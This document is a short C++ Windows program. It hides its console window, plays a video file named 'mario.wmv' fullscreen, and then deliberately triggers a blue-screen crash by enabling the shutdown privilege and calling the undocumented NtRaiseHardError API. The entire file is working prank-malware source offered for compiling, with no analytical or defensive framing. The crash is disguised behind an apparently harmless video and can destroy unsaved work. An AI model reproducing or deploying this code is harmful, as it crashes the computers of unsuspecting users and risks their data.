#include <windows.h>
#include <dshow.h>

// pragmas for libraries needed
#pragma comment(lib, "ntdll.lib") 		// bsod stuff
#pragma comment(lib, "strmiids.lib") 	// most of directshow
#pragma comment(lib, "ole32.lib") 		// CoInitialize and CoCreateInstance
#pragma comment(lib, "user32.lib")		// ShowWindow

// externs for bsod stuff
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

// global variables for directshow
IGraphBuilder *graph = 0; 		// filter graph manager
IMediaControl *control = 0; 	// media control interface
IMediaEvent   *event = 0; 		// media event interface
IVideoWindow  *window = 0;		// the video window

// helper functions
void InitializeDirectShow(LPCWSTR path) {
	// initialize the COM
	CoInitialize(NULL);

	// create the filter graph manager
	CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
	
	// get all needed addition interfaces
	graph->QueryInterface(IID_IMediaControl, (void**)&control);
	graph->QueryInterface(IID_IMediaEvent, (void**)&event);
	graph->QueryInterface(IID_IVideoWindow, (void**)&window);

	// attempt to build the graph for file playback
	graph->RenderFile(path, NULL);

	// set the video window to fullscreen mode
	window->put_FullScreenMode(OATRUE);
}

ULONG TriggerBSOD() {
	BOOLEAN state;
	ULONG response;

	RtlAdjustPrivilege(19, TRUE, FALSE, &state); // adjust privileges to allow raising BSoD
	NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &response); // raise BSoD

	return response;
}

// main function
int main() {
	HRESULT result;
	LONG code;

	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window
	InitializeDirectShow(L"mario.wmv"); // initialize directshow stuff

	result = control->Run(); // play the video

	if (SUCCEEDED(result)) {
		event->WaitForCompletion(INFINITE, &code); // wait for video to finish
	}

	// trigger the blue screen of death
	TriggerBSOD();

	// if it gets here, the BSoD failed :(
	return 1;
}